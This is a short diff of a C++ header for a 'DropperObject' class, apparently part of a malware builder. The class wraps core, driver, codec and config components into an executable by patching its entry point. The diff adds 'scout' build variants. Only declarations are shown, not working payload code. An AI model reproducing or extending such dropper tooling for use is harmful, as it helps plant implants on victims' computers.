@@ -12,6 +12,7 @@ namespace bf = boost::filesystem;
 
 #include "common.h"
 #include "DropperCode.h"
+#include "DropperCodeScout.h"
 
 typedef struct _patch_t {
 	DWORD VA;
@@ -81,13 +82,15 @@ private:
 	int _getIATCallIndex(std::string dll, std::string call);
 
 	DWORD _build(WINSTARTFUNC OriginalEntryPoint, std::string fPrefix);
+	DWORD _build_scout(WINSTARTFUNC OriginalEntryPoint, std::string fPrefix);
 
 	ULONG _exeType;
 
 public:
 	DropperObject(PEObject& pe);
 	
-	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap );
+	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap, BOOL isScout );
+	bool build_scout( bf::path scout );
 	char* getRestoreStub() 
 	{ 
 		DataSectionHeader* header = (DataSectionHeader*)_data.get();
